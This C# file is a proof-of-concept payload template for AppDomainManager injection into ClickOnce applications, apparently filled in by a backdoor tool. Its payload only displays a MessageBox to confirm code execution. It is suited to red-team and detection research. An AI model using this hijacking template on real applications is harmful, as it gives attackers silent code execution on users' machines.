/*
 * ClickOnce AppDomainManager Injection — MessageBox PoC
 * =====================================================
 * Proof-of-concept payload that displays a MessageBox when the
 * target ClickOnce application loads. Confirms code execution
 * via AppDomainManager hijacking without any network activity.
 *
 * Placeholders (replaced by clickonce_backdoor.py):
 *   {CLASSNAME} — AppDomainManager class name (e.g. SmartCloudManager)
 *
 * Compile:
 *   csc.exe /t:library /platform:x86 /out:Payload.dll MessageBoxPoC.cs
 */

using System;
using System.Runtime.InteropServices;

public sealed class {CLASSNAME} : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        Loader.Execute();
        return;
    }
}

public class Loader
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    public static bool Execute()
    {
        MessageBox(IntPtr.Zero, "AppDomainManager Injection - PoC", "ClickOnce Backdoor", 0);
        return true;
    }
}
